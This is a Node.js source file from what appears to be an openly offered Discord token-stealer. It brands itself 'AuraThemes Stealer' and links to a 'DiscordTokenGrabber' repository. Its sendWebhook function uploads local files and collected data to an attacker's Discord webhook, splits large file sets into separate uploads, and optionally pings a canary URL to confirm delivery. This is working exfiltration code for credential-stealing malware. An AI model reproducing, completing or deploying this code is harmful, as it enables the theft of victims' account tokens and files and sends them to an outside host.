const fs       = require('fs');
const axios    = require('axios');
const FormData = require('form-data');

async function sendWebhook(webhookUrl, data, files = [], canary) {
    const form = new FormData();
    
    let fileCount = 0;

    if (files.length > 10) {
        await sendWebhook(webhookUrl, data);
        for (const file of files) {
            fileCount++;
            await sendWebhook(webhookUrl, {
                ...data,
                content: `Attachment ${fileCount}: \`${file}\``
            }, [file]);
        }
        return;
    }

    for (const file of files) {
        const fileStream = fs.createReadStream(file);
        form.append(`file[${fileCount}]`, fileStream, { filename: file });
        fileCount++;
    }

    data.username = "AuraThemes Stealer";
    data.avatar_url = "https://i.imgur.com/WkKXZSl.gif";

    if (data.embeds) {
        for (const embed of data.embeds) {
            embed.color = 12740607;
            embed.footer = {
                text: "github.com/k4itrun/DiscordTokenGrabber - made by k4itrun",
                icon_url: "https://avatars.githubusercontent.com/u/103044629"
            };
            embed.timestamp = new Date();
        }
    }

    form.append('payload_json', JSON.stringify(data));

    try {
        await axios.post(webhookUrl, form, {
            headers: form.getHeaders()
        });
        if (canary) {
            await axios.get(canary);
        }
    } catch (error) {
        console.error('Error sending webhook:', error.response ? error.response.data : error.message);
    }
}

module.exports = {
    sendWebhook,
}
